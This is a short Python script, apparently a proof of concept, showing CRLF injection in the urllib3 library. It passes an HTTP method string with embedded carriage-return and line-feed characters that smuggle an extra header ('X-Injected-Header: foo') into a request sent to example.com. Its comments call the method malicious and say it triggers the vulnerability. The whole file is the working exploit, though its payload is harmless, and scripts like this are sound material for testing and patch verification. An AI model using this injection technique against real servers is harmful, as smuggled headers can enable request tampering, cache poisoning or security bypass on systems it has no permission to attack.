# Import the urllib3 module
import urllib3

# Create a connection pool
http = urllib3.PoolManager()

# Define a malicious HTTP request method
# This method has CR and LF characters
# These characters will inject additional HTTP headers
method = "GET\r\nX-Injected-Header: foo\r\n"

# Define a URL to send the request to
url = "http://example.com/"

# Send the request with the malicious method
# This will trigger the vulnerability in the urllib3 module
# The server will receive the injected header
response = http.request(method, url)